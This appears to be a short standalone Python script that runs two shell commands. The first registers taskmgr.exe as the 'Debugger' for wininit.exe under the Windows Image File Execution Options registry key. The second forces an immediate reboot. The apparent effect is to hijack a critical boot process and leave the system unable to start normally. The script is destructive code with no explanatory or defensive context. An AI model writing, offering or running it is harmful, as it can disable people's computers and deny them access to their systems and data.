import os
os.system(fr'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe" /v Debugger /d taskmgr.exe /f')
os.system(fr"shutdown -r -t 0")
